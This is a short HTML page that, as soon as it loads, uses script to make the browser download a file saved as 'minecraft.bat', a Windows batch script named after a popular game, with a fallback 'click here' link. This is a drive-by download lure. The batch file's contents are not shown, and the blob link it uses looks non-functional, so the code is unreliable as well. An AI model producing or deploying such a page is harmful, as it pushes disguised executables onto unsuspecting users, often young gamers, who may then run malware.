<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Auto Download</title>
</head>
<body>
  <script>
    window.onload = function() {
      const link = document.createElement("a");
      link.href = "blob:https://github.com/6de07439-0210-4eec-9305-bee778bed484"; // RAW file link
      link.download = "minecraft.bat"; // File name to save as
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    };
  </script>
  <p>If the download doesn't start automatically, <a href="blob:https://github.com/6de07439-0210-4eec-9305-bee778bed484" download>click here</a>.</p>
</body>
</html>
